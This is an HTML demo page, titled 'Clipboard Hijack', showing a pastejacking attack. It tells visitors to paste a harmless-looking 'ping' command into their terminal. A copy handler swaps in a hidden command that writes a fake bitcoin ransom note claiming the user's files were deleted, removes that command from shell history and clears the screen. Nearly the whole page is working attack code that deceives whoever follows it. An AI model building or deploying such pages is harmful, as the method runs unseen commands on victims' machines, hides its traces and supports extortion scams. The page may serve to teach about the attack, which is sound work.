  <title>Clipboard Hijack</title>
  <meta charset="utf-8">
  <style>
    pre {
      background-color: #eee;
      padding: 1em;
      margin: 1em;
    }
    h3 {
      margin: 1em;

    .more {
      margin: 0 1em;

      font-family: sans-serif;
    }
    .more a {
       text-decoration: none;
    }
  </style>
</head>
<body>
  <h3>1. 选中下面内容复制粘贴到命令行运行：</h3>
  <pre id="code">ping baidu.com</pre>
  <script>
    code.oncopy = function(e) {
      var text = code.textContent
      var s = "\n" + "echo '[温馨提示]您当前目录的文件已经被我删除\\n如果想找回，请往 *** 账号里面打 0.01 比特币，我会联系你。' > hijack && ls >> hijack && history -d $(($HISTCMD-1)) && clear\n" + text
      navigator.clipboard.writeText(s)
    }
  </script>
  <h3>2. 查看目录变化:</h3>
  <pre>ls | grep hijack</pre>
